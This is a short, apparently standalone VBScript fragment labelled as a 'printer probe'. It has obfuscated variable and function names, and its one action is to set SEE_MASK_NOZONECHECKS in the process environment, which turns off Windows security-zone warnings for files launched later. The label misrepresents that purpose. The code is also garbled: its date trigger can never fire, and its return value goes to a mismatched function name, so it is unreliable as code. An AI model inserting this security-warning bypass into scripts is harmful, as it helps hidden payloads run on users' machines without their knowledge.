' --- printer probe ---
Function DecodeManifest91()
On Error Resume Next
  Dim strValue74,strKey12,strProfileBlob4
  Set strValue74=CreateObject("WScript.Shell")
  strKey12=strValue74.ExpandEnvironmentStrings("%TEMP%")
  strProfileBlob4=strValue74.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strKey12)>0 And Len(strProfileBlob4)>0 Then
    strValue74.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    ResolveConfigCipher12=1
    Exit Function
  End If
  ResolveConfigCipher12=0
End Function

If Day(Now) > 31 Then
  Call DecodeManifest91()
End If


